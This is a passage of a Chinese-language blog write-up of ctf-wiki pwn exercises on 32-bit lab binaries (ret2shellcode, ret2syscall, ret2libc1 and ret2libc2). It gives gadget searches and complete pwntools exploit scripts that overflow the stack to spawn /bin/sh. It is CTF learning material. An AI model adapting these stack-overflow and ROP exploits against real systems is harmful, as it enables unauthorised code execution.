<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>不装模作样分析，直接看<code>strncpy</code>，函数签名是 <code>strncpy(char* dest,const char* src, size_t count)</code>，写入的位置 <code>buf2</code> 观察下有没有执行权限。<code>buf2</code> 是可读写全局变量，这种全局变量放置在<code>.bss</code>段，所以直接看<code>.bss</code>段有没有可执行属性。</p>
<p><img src=/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823181351695.png width=583 height=61 srcset="/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823181351695_hu15b94843b2e60a3c277f933546fba541_5458_480x0_resize_box_3.png 480w, /p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823181351695_hu15b94843b2e60a3c277f933546fba541_5458_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220823181351695 class=gallery-image data-flex-grow=955 data-flex-basis=2293px></p>
<p>emmm&mldr;&mldr;</p>
<p><img src=/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823181428657.png width=760 height=153 srcset="/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823181428657_hu0fb50fae7317e1ff7df4938f59edd46d_76970_480x0_resize_box_3.png 480w, /p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823181428657_hu0fb50fae7317e1ff7df4938f59edd46d_76970_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220823181428657 class=gallery-image data-flex-grow=496 data-flex-basis=1192px></p>
<p>emmmmmmmmmm&mldr;&mldr;&mldr;.</p>
<p>好。那不用看 ctf-wiki 的题解了，按自己的思路来。<code>checksec</code> 的结果是 <code>NX: false</code>，栈上有可执行权限。而且没有 PIE，关了 ASLR 直接硬编码栈上地址就完事。</p>
<p>老规矩算一下 buf <code>0xffffd0ec</code> 到返回地址的 <code>0xffffd15c</code> 距离，溢出后地址设置为<code>buf</code>的地址。计算得距离 112 字节，接下来写 exploit 。</p>
<h3 id=exploit-1>exploit</h3>
<blockquote>
<p>注意环境变量数量会影响 <code>&buf</code> 的地址，为了保证得到的地址和 <code>pwn.process</code> 启动一致，最好调试时也使用 <code>pwn.gdb.debug</code> 启动，设置下 <code>env={}</code>。或自己管理环境变量，确保不影响栈上变量的地址。</p>
</blockquote>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>pwn</span>
<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=n>shellcraft</span>
<span class=kn>import</span> <span class=nn>struct</span>

<span class=n>p</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>process</span><span class=p>(</span><span class=s1>&#39;./bin/ret2shellcode&#39;</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=p>{})</span>
<span class=n>payload</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>linux</span><span class=o>.</span><span class=n>sh</span><span class=p>())</span>
<span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>112</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span>
<span class=n>payload</span> <span class=o>+=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;I&#39;</span><span class=p>,</span> <span class=mh>0xffffddcc</span><span class=p>)</span>
<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></td></tr></table>
</div>
</div><p><img src=/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824095344282.png width=640 height=194 srcset="/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824095344282_hubc47eafd56834041f67351860fb006fd_73328_480x0_resize_box_3.png 480w, /p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824095344282_hubc47eafd56834041f67351860fb006fd_73328_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220824095344282 class=gallery-image data-flex-grow=329 data-flex-basis=791px></p>
<h2 id=ret2syscall>ret2syscall</h2>
<blockquote>
<p>题目来自 ctf-wiki。</p>
</blockquote>
<h3 id=基本信息-2>基本信息</h3>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext># file
bin/ret2syscall: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped
# checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
</code></pre></td></tr></table>
</div>
</div><h3 id=行为分析-2>行为分析</h3>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>(.venv) vm :: repos/pwn/lab-4 » bin/ret2syscall
This time, no system() and NO SHELLCODE!!!
What do you plan to do?
123
</code></pre></td></tr></table>
</div>
</div><h3 id=反编译分析-2>反编译分析</h3>
<p>还是 Ghidra ，熟悉下工具。</p>
<p><img src=/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824102626145.png width=467 height=312 srcset="/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824102626145_hu9c7c0837418d16fd6a6e1af973e1a558_15061_480x0_resize_box_3.png 480w, /p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824102626145_hu9c7c0837418d16fd6a6e1af973e1a558_15061_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220824102626145 class=gallery-image data-flex-grow=149 data-flex-basis=359px></p>
<p>只有一个输入，buf实际长度应该是100，和返回地址距离112。因为NX开启栈段是没有执行权限的。简单翻一下 PLT 发现也确实没有 <code>system</code> 函数。</p>
<p>x86 32位系统调用 int 80h 方式需要通过寄存器传参和传递系统调用号，单覆盖一个返回地址是屁用没有的。想要构造出系统调用必须的上下文（覆盖给定的寄存器），就需要找到一个或多个 <code>pop; ret</code> 指令序列，填充好寄存器后再跳转到 <code>int $0x80</code>指令处。</p>
<p>需要控制的寄存器有：<code>eax</code>、<code>ebx</code>、<code>ecx</code>、<code>edx</code> 四个。</p>
<p>用 ROPGadget 查找可用的 Gadgets 。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>(.venv) vm :: repos/pwn/lab-4 » ROPgadget --binary bin/ret2syscall --only &#39;pop|ret&#39; | grep &#39;eax&#39;
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
</code></pre></td></tr></table>
</div>
</div><p>第一个和第六个都能控制多个寄存器，但都有多余的 <code>pop</code> 指令，我们先选第二个 <code>0x080bb196 : pop eax ; ret</code> 再搜索控制<code>ebx</code>的指令序列。简单起见我就把其他结果略了，下面的结果正好控制了剩余三个寄存器 <code>ebx</code>、<code>ecx</code>、<code>edx</code>。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
</code></pre></td></tr></table>
</div>
</div><p>再寻找一个 <code>int $0x80</code> 。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>(.venv) vm :: repos/pwn/lab-4 » ROPgadget --binary bin/ret2syscall --only &#39;int&#39;
Gadgets information
============================================================
0x08049421 : int 0x80
</code></pre></td></tr></table>
</div>
</div><p>然后顺便找一下有没有现成的 <code>/bin/sh</code> 或者 <code>sh</code> 字符串可以用。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>(.venv) vm :: repos/pwn/lab-4 » ROPgadget --binary bin/ret2syscall --string &#39;/bin/sh&#39;
Strings information
============================================================
0x080be408 : /bin/sh
</code></pre></td></tr></table>
</div>
</div><p>我们最终想要得到的栈是这样的：</p>
<p><img src=/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824135729859.png width=389 height=400 srcset="/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824135729859_hu9e96c79361d03e349d816785438cafc1_14374_480x0_resize_box_3.png 480w, /p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824135729859_hu9e96c79361d03e349d816785438cafc1_14374_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220824135729859 class=gallery-image data-flex-grow=97 data-flex-basis=233px></p>
<p>现在已经凑齐了所有要素，可以开始写 exploit 。</p>
<h3 id=exploit-2>exploit</h3>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>pwn</span>
<span class=kn>import</span> <span class=nn>struct</span>

<span class=n>p</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>process</span><span class=p>(</span><span class=s1>&#39;./bin/ret2syscall&#39;</span><span class=p>)</span>

<span class=c1># gadgets chain</span>
<span class=n>gadget1</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>p32</span><span class=p>(</span><span class=mh>0x080bb196</span><span class=p>)</span> <span class=c1># pop eax; ret</span>
<span class=n>eax</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>p32</span><span class=p>(</span><span class=mi>11</span><span class=p>)</span>
<span class=n>gadget2</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>p32</span><span class=p>(</span><span class=mh>0x0806eb90</span><span class=p>)</span> <span class=c1># pop edx; pop ecx; pop ebx; ret</span>
<span class=n>edx</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
<span class=n>ecx</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
<span class=n>ebx</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>p32</span><span class=p>(</span><span class=mh>0x080be408</span><span class=p>)</span>
<span class=n>gadget3</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>p32</span><span class=p>(</span><span class=mh>0x08049421</span><span class=p>)</span> <span class=c1># int 0x80</span>

<span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mi>112</span><span class=p>,</span> <span class=n>gadget1</span><span class=p>,</span> <span class=n>eax</span><span class=p>,</span> <span class=n>gadget2</span><span class=p>,</span> <span class=n>edx</span><span class=p>,</span> <span class=n>ecx</span><span class=p>,</span> <span class=n>ebx</span><span class=p>,</span> <span class=n>gadget3</span><span class=p>])</span>
<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></td></tr></table>
</div>
</div><p><img src=/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824143615364.png width=576 height=326 srcset="/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824143615364_hue1fc015f3eb8abbab4e390521870d2be_96854_480x0_resize_box_3.png 480w, /p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824143615364_hue1fc015f3eb8abbab4e390521870d2be_96854_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220824143615364 class=gallery-image data-flex-grow=176 data-flex-basis=424px></p>
<h2 id=ret2libc1>ret2libc1</h2>
<h3 id=基本信息-3>基本信息</h3>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext># file
bin/ret2libc1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped
# checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
</code></pre></td></tr></table>
</div>
</div><h3 id=行为分析-3>行为分析</h3>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>(.venv) vm :: repos/pwn/lab-4 » bin/ret2libc1
RET2LIBC &gt;_&lt;
hi
</code></pre></td></tr></table>
</div>
</div><h3 id=反编译分析-3>反编译分析</h3>
<p><img src=/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824144511924.png width=346 height=274 srcset="/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824144511924_huc3898cbd26261fafa9dbe37914e2eadc_9826_480x0_resize_box_3.png 480w, /p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824144511924_huc3898cbd26261fafa9dbe37914e2eadc_9826_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220824144511924 class=gallery-image data-flex-grow=126 data-flex-basis=303px></p>
<p>老样子。112偏移，看一眼有没有可利用的字符串。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>(.venv) vm :: repos/pwn/lab-4 » ROPgadget --binary bin/ret2libc1 --string &#39;/bin/sh&#39;
Strings information
============================================================
0x08048720 : /bin/sh
</code></pre></td></tr></table>
</div>
</div><p>再看一眼 PLT 有没有 <code>system</code> 函数。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>(.venv) vm :: repos/pwn/lab-4 » objdump -d -j .plt bin/ret2libc1 | grep system
08048460 &lt;system@plt&gt;:
</code></pre></td></tr></table>
</div>
</div><p>接下来就简单了，直接写 exploit 。</p>
<h3 id=exploit-3>exploit</h3>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>

<span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./bin/ret2libc1&#39;</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=p>{})</span>
<span class=c1>#                          &amp;system  reta  &#34;/bin/sh&#34;</span>
<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>flat</span><span class=p>([</span><span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mi>112</span><span class=p>,</span> <span class=mh>0x08048460</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x08048720</span><span class=p>]))</span>
<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></td></tr></table>
</div>
</div><p><img src=/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824150019457.png width=529 height=142 srcset="/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824150019457_hu3f9da3aecace7a315fedd4f993e87fc4_43234_480x0_resize_box_3.png 480w, /p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824150019457_hu3f9da3aecace7a315fedd4f993e87fc4_43234_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220824150019457 class=gallery-image data-flex-grow=372 data-flex-basis=894px></p>
<h2 id=ret2libc2>ret2libc2</h2>
<h3 id=基本信息-4>基本信息</h3>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext># file
bin/ret2libc2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped
# checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
</code></pre></td></tr></table>
</div>
</div><h3 id=行为分析-4>行为分析</h3>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>(.venv) vm :: repos/pwn/lab-4 » bin/ret2libc2
Something surprise here, but I don&#39;t think it will work.
What do you think ?no
</code></pre></td></tr></table>
</div>
</div><h3 id=反编译分析-4>反编译分析</h3>
<p><img src=/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824151009192.png width=545 height=248 srcset="/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824151009192_hu998f81bff57390f93f7add16304dd4dc_12132_480x0_resize_box_3.png 480w, /p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824151009192_hu998f81bff57390f93f7add16304dd4dc_12132_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220824151009192 class=gallery-image data-flex-grow=219 data-flex-basis=527px></p>
<p><code>main</code> 函数里没有有用的内容。搜索 <code>/bin/sh</code> 字符串无结果，但有 <code>system</code> 函数。那我们考虑下怎么往里面填一个 <code>/bin/sh</code> 。大致扫上一眼没有别的值得关注的地方，就开始考虑下怎么填字符串。</p>
<p>填字符串最直接的办法就是往栈上压，然后栈上地址传给 <code>system</code> 。缺点是这个做法在开启 PIE 的时候就没成功过，大概是栈上变量的地址一直在变。</p>
<p>另一个办法是找个 RW 权限的内存段往里面写，然后把地址传给 <code>system</code>。注意到导出符号有一个全局变量 <code>buf2</code>。</p>
<p><img src=/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824151516232.png width=808 height=97 srcset="/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824151516232_hua14393bc0c02aeb4d10acd8ae65d38a0_6808_480x0_resize_box_3.png 480w, /p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824151516232_hua14393bc0c02aeb4d10acd8ae65d38a0_6808_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220824151516232 class=gallery-image data-flex-grow=832 data-flex-basis=1999px></p>
<p><code>buf2</code> 是一个可写的全局变量，在<code>.bss</code>段里，我们直接用它，配合 <code>gets</code> 来控制程序读 <code>/bin/sh</code> 字符串。</p>
<p>预期的栈结构如下。</p>
<p><img src=/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824151928918.png width=380 height=211 srcset="/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824151928918_hu46aa81efd2eff6f417a96b74e87a0121_7512_480x0_resize_box_3.png 480w, /p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824151928918_hu46aa81efd2eff6f417a96b74e87a0121_7512_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220824151928918 class=gallery-image data-flex-grow=180 data-flex-basis=432px></p>
<p><code>gets</code> 读取完<code>/bin/sh</code>后直接跳转<code>system</code>，原先作为<code>gets</code>参数的<code>buf2</code>地址就变成了<code>system</code>的返回地址，不过我们不在乎。第二个<code>buf2</code>则变成了<code>system</code>的参数。</p>
<p>从 plt 取 <code>gets</code> 和 <code>system</code> 函数的地址，然后开始写 exploit 。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>(.venv) vm :: repos/pwn/lab-4 » objdump -d -j .plt bin/ret2libc2 | grep system
08048490 &lt;system@plt&gt;:
(.venv) vm :: repos/pwn/lab-4 » objdump -d -j .plt bin/ret2libc2 | grep gets
08048460 &lt;gets@plt&gt;:
</code></pre></td></tr></table>
</div>
</div><h3 id=exploit-4>exploit</h3>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>

<span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./bin/ret2libc2&#39;</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=p>{})</span>
<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>flat</span><span class=p>([</span><span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mi>112</span><span class=p>,</span> <span class=mh>0x08048460</span><span class=p>,</span> <span class=mh>0x08048490</span><span class=p>,</span> <span class=mh>0x0804a080</span><span class=p>,</span> <span class=mh>0x0804a080</span><span class=p>]))</span>
<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh&#39;</span><span class=p>)</span>
<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></td></tr></table>
</div>
</div><p><img src=/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824152429647.png width=560 height=146 srcset="/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824152429647_hu439c30787bd0a6b832c38ee2ef01b982_50569_480x0_resize_box_3.png 480w, /p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824152429647_hu439c30787bd0a6b832c38ee2ef01b982_50569_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220824152429647 class=gallery-image data-flex-grow=383 data-flex-basis=920px></p>
<h2 id=ret2libc3>ret2libc3</h2>
<h3 id=基本信息-5>基本信息</h3>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext># file
bin/ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, with debug_info, not stripped
# checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
</code></pre></td></tr></table>
</div>
</div><h3 id=行为分析-5>行为分析</h3>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext>(.venv) vm :: repos/pwn/lab-4 » bin/ret2libc3
No surprise anymore, system disappeard QQ.
Can you find it !?no
